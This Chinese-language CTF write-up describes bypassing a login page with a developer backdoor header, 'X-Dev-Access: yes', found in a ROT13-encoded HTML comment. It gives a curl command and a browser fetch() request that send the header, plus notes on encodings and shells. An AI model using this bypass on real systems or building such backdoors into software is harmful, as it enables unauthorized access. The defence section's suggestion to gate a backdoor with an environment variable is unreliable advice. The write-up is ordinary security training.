# CTF-02：Developer Header 绕过登录

> 第二道题。ROT13 解码 + 自定义 Header 绕过鉴权。
> 关联：上一题 ← [[CTF-01_Session不过期与Cookie劫持.md]] | 下一题 → [[CTF-03_SSTI与Jinja2模板注入.md]]

---

## 题目

一个登录页面，前端看起来正常。但 HTML 注释里留了信息。

---

## 解题过程

### Step 1：看源码

`F12` → 查看 HTML 源码，发现两行注释：

```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

第二行不用解码，意思是「上线前记得删掉」。开发者忘了。

### Step 2：解码注释

看到 `Wnpx` 全是字母，没有数字或符号。这是 **ROT13** 的典型特征。

ROT13 解码（在线搜 ROT13 decoder，或者笔算：每个字母往后移 13 位，Z 回到 A）：

```
ABGR → NOT
Wnpx → Jack
grcbenel olcnff → temporary bypass
"K-Qri-Npprff: lrf" → "X-Dev-Access: yes"
```

意思是：**Jack 的临时绕过——加请求头 "X-Dev-Access: yes"**

### Step 3：加 Header 发请求

#### 用 curl（cmd 里跑）
```cmd
curl -H "X-Dev-Access: yes" -X POST -H "Content-Type: application/json" -d "{\"email\":\"a\",\"password\":\"b\"}" http://target.com/login
```

#### 或者直接 F12 Console 里跑
```javascript
fetch('/login', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-Dev-Access': 'yes'
    },
    body: JSON.stringify({email: 'a', password: 'b'})
})
.then(r => r.json())
.then(d => console.log(d))
```

绕过登录，flag 直接出来。

---

## 编码知识

CTF 里常见的编码，看到乱码时按特征判断：

| 编码 | 特征 | 例子 |
|------|------|------|
| **ROT13** | 只有字母，A-Z/a-z | `Wnpx` → `Jack` |
| **Base64** | 字母+数字+`+/=`，长度是 4 的倍数 | `SGFja0NURg==` |
| **Hex** | 只有 0-9 a-f | `4861636b` → `Hack` |
| **ROT47** | 有符号，范围更广 | 比 ROT13 更乱 |

快速判断法：**全是字母 → 先试 ROT13。有数字和符号 → 试 Base64。**

---

## cmd 和 PowerShell 的区别

这道题踩了一个常见的坑：用 curl 时命令不对。

| | cmd | PowerShell |
|---|---|---|
| `curl` 是什么 | 真的 curl | 假的，别名指向 `Invoke-WebRequest` |
| 用真 curl | `curl` | `curl.exe` |
| 管道传什么 | 文本 | 对象 |
| 建议 | CTF 里直接开 cmd 用 | 避不开就用 `curl.exe` |

**Windows Terminal 只是一个壳**，它默认开的是 PowerShell。看标签栏写的是 PowerShell 还是 cmd 就知道自己在哪。

如果不想切 shell，还有一个更简单的方法——开 F12 Console，用 JS 的 `fetch` 发请求，绕过所有命令行问题。

---

## 知识点

| 知识点 | 说明 |
|--------|------|
| **ROT13** | 字母移位加密，全字母乱码先试这个 |
| **特征判断法** | 看字符集猜编码，而不是盲目试 |
| **自定义请求头绕过** | 开发者在代码里留了后门 header，不需要密码 |
| **注释泄露** | 上线前没删掉的注释 = 白送信息 |

## 防御

- 不上线调试代码 / 后门
- 如果必须有后门，用环境变量控制开关
